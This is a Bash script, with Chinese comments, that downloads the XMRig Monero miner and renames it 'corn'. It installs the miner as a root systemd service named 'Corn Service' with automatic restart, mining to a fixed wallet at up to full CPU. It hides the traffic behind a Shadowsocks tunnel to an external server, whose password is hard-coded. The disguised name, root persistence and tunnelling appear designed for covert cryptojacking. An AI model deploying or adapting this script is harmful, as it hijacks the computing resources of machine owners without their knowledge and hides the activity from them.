#!/bin/bash



# 安裝 Shadowsocks-libev

sudo apt install shadowsocks-libev -y

#創資料夾

mkdir /home/corn

cd /home/corn

# 下載並解壓 xmrig

wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz

mv xmrig-6.22.2-linux-static-x64.tar.gz corn.tar.gz

tar xzfv corn.tar.gz

mv /home/corn/xmrig-6.22.2/xmrig /home/corn/corn

rm -R /home/corn/xmrig-6.22.2

# 建立 xmrig systemd 服務檔 (注意：這裡的 ExecStart 中 --proxy 參數使用本地 127.0.0.1:1080)

cat > /home/corn/config.json <<EOL

{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": true,
        "rdmsr": false,
        "wrmsr": false,
        "cache_qos": true,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": 100,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": "rx/0",
            "coin": null,
            "url": "pool.supportxmr.com:443",
            "user": "43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd",
            "pass": "x",
            "rig-id": null,
            "nicehash": true,
            "keepalive": true,
            "enabled": true,
            "tls": true,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": "null",
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}

EOL

sudo cat >/etc/systemd/system/corn.service <<EOL

[Unit]

Description=Corn Service

After=network.target



[Service]

WorkingDirectory=/home/corn

ExecStart=/home/corn/corn

#ExecStart=/home/corn/corn -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x -k --proxy 127.0.0.1:1080 

Restart=always

RestartSec=10

KillSignal=SIGINT

SyslogIdentifier=xmrig

User=root



[Install]

WantedBy=multi-user.target

EOL



#sudo cat >/etc/systemd/system/xmrig2.service <<EOL

#[Unit]

#Description=Xmrig Miner Service

#After=network.target



#[Service]

#WorkingDirectory=/home/ubuntu/xmrig-6.22.2

#ExecStart=/home/ubuntu/xmrig-6.22.2/xmrig -o 114.29.237.94:3333 -u 43cx2hYimLw9YkAYxLG8Vg2TStTL3r6XmbfDfBiCY9MCViYCCaYpEzr1BUCmZTquQwLpg7Sb1FhrV4qR5EXWwvkgKdSHVLd -p x --proxy 127.0.0.1:1080 -t 8 --cpu-affinity 0xAAAA

#Restart=always

#RestartSec=10

#KillSignal=SIGINT

#SyslogIdentifier=xmrig

#User=root



#[Install]

#WantedBy=multi-user.target

#EOL



# 建立 ss-local systemd 服務檔

sudo cat >/etc/systemd/system/ss-local.service <<EOL

[Unit]

Description=Shadowsocks Local Client

After=network.target



[Service]

ExecStart=/usr/bin/ss-local -c /etc/shadowsocks-libev/config.json

Restart=on-failure

RestartSec=10

LimitNOFILE=4096



[Install]

WantedBy=multi-user.target

EOL



# 建立 Shadowsocks 配置檔

cat >/etc/shadowsocks-libev/config.json <<EOL

{

    "server": "114.29.237.94",

    "server_port": 443,

    "local_address": "127.0.0.1",

    "local_port": 1080,

    "password": "abc123",

    "timeout": 300,

    "method": "chacha20-ietf-poly1305",

    "mode": "tcp_and_udp"

}

EOL



# 重新載入 systemd 配置



sudo systemctl daemon-reload



sudo systemctl stop corn.service



sudo systemctl stop ss-local.service

# 啟用並啟動服務 (注意：服務名稱修正為 ss-local.service)



sudo systemctl enable corn.service



sudo systemctl reenable corn.service



sudo systemctl enable ss-local.service



sudo systemctl reenable ss-local.service



sudo systemctl start ss-local.service



sudo systemctl start corn.service
